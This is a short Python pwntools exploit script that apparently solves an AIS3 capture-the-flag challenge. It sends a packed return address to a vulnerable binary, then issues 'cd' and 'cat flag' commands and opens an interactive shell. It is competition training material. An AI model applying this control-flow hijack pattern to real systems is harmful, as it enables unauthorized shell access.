#!/usr/bin/env python
from pwn import *

DEBUG = not False

if DEBUG:
    r = process('pwn1.bin')
else:
    r = remote('quiz.ais3.org', 9561)

r.recvuntil(':')
r.sendline(p32(0x08048613))

if not DEBUG:
    r.sendline("cd /home/pwn1")
    r.sendline("cat flag")
    print r.recvline()

r.interactive()
r.close()

